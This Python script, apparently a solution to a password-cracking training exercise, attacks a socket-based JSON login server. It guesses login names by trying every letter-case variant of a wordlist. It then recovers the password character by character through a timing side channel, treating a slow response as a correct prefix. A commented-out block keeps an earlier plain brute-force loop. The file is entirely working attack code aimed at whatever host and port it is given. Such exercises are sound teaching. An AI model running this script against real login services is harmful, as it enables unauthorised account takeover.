import socket
import sys
import string
import itertools
import json
from datetime import datetime

def connect_to_server(localhost, port):
    with socket.socket() as client_socket:
        host_name = localhost
        port = int(port)
        address = (host_name, port)
        client_socket.connect(address)
        with open("logins.txt", "r") as logins_dict:
            for line in logins_dict:
                # change case of different letters
                logins = (map(''.join, itertools.product(*((char.upper(), char) for char in line.strip()))))
                for login in logins:
                    result = send_message(login, " ", client_socket)[0]
                    if result == "Wrong password!":
                        symbols = list(string.ascii_lowercase + string.digits + string.ascii_uppercase)
                        password_temp = ""
                        while True:
                            for symbol in symbols:
                                password = password_temp + symbol
                                start = datetime.now()
                                result, request = send_message(login, password, client_socket)
                                finish = datetime.now()
                                delay = (finish - start).microseconds
                                if delay > 1000:
                                    password_temp += symbol
                                    break
                                elif result == "Connection success!":
                                    print(request)
                                    return
                                else:
                                    continue
                    elif result == "Too many attempts":
                        print("Too many attempts")
                        return


def send_message(login, password, socket_name):
    request = {"login": login, "password": password}
    request_json = json.dumps(request)
    socket_name.send(request_json.encode())
    response_json = socket_name.recv(1024).decode()
    return json.loads(response_json)["result"], request_json


args = sys.argv
connect_to_server(args[1], args[2])


"""
    BRUTAL FORCE
        symbols = list(string.ascii_lowercase + string.digits)
        status = True
        iter = 1

        while status == True:
            for symbol in itertools.product(symbols, repeat=iter):
                password = "".join(symbol)
                client_socket.send(password.encode())
                response = client_socket.recv(2024).decode()
                if response == "Connection success!":
                    print(password)
                    status = False
                    break
                elif response == "Too many attempts":
                    print("Too many attempts")
                    status = False
                    break
            iter += 1
"""

